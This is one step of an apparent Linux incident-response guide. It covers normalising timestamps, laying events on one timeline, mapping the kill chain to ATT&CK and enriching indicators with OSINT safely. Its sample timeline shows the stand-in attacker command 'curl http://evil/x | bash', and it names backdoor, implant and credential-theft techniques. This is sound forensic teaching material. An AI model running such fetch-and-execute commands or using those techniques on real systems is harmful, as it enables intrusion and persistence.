# 09 · Build the Timeline & Chain of Events (Linux)

*Assemble your scattered findings into one ordered story: patient zero → foothold → actions → now.*

The method is identical to
[../windows/09-build-the-timeline-and-chain.md](../windows/09-build-the-timeline-and-chain.md);
here are the Linux time sources and the OSINT-safe rules.

---

## Step 1 — Normalize to UTC

Convert every timestamp to UTC using the offset/skew you recorded in step 00. Label **activity
time** vs **detection time**. Watch for **timestomping** — attackers `touch -r`/`touch -t` to
backdate files; the filesystem **change time (ctime)** is harder to forge than mtime, so compare
them:

```bash
stat /path/to/suspect     # Access / Modify / Change — a Change far after Modify hints at tampering
```

## Step 2 — Lay events on one line

| Source (step) | Contributes |
|---|---|
| Journal / auth logs (05) | Logons, sudo, service/cron installs, useradd, log tampering |
| Package logs (05) | Install/upgrade times (explains "deleted" daemons) |
| Filesystem times (06) | File create/modify (mind timestomping) |
| `linux.bash` from memory (08) | The attacker's actual typed commands, timestamped |
| Memory (08) | Task create times, injected threads, live C2 |
| Sockets/flow (04, 08) | When beaconing/exfil started |

```
2026-07-01T14:02Z  sshd: Accepted password for root from 203.0.113.9    (auth.log — brute-forced)
2026-07-01T14:04Z  curl http://evil/x | bash                            (linux.bash from memory)
2026-07-01T14:04Z  /dev/shm/.x written, executed (deleted from disk)    (proc/exe + ctime)
2026-07-01T14:05Z  Beacon to 45.x.x.x:443 begins                        (linux.netstat)
2026-07-01T14:12Z  authorized_keys backdoor added to /root/.ssh         (file ctime + step 05)
2026-07-01T15:40Z  journal vacuumed                                     (journal tamper)  ← anti-forensics
```

## Step 3 — Draw the kill chain

Map to ATT&CK phases; a gap (execution but no initial access) means a missing finding — go back.
Common Linux chain: `sshd`/webshell initial access → `curl|bash` execution → `/dev/shm` implant →
`authorized_keys` + cron/systemd persistence → SUID/sudo priv-esc → `/etc/shadow` cred access →
SSH lateral movement → C2 → exfil.

## Step 4 — Enrich indicators with OSINT — safely

Same rules as the Windows guide:
- **Do:** look up **hashes** (not files); use offline GeoIP for IP→country; prefer passive DNS /
  urlscan / VT *search* over touching the live C2.
- **Don't:** upload a possibly-targeted sample to public VT; `curl`/`dig` the **live C2** from a
  corporate IP; paste internal IPs/hostnames/usernames into third-party tools — redact first.

## Step 5 — Scope: one host or a campaign?

Cross-reference confirmed indicators (hash, C2 IP, SSH key, dropped filename) against other hosts.
An SSH key reused across accounts/hosts, or the same implant hash elsewhere, means **lateral
movement / campaign** — widen the net, and treat the implicated credentials/keys as burned
everywhere.

---

➡️ Next: [10-eradicate.md](10-eradicate.md)

*Toolkit parallel: `generate_reports.py` emits `Timeline.md` + `Attack_Graph.md` (normalized via
`_clock.json`); `correlate_campaign.py` does the cross-host indicator sweep.*
